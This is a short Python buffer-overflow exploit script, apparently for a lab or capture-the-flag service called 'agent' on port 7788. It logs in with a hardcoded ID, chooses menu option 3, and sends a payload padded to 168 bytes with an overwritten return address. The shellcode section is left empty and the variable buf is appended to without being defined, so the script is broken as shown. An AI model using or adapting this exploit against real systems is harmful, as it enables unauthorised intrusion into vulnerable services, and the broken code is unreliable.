#!/usr/bin/python3
import time, struct, sys
import socket as so


#shellcodes generados



buf += b"A" * (168 - len(buf))

buf += b"\x63\x85\x04\x08\n"

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print("[+] Usage example: python %s 192.168.56.103 7788" % sys.argv[0])
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print("\n[+] Attempting to send buffer overflow to agent....")
try: 
   s.connect((server, port))
   s.recv(1024)
   s.send(b"48093572\n")
   s.recv(1024)
   s.send(b"3\n")
   s.send(buf)
   s.recv(1024)
   print("\n[+] Completed.")
except:
   print("[+] Unable to connect to agent over port 7788. Check your IP address and port. Make sure 7788 is really open.")
   sys.exit()
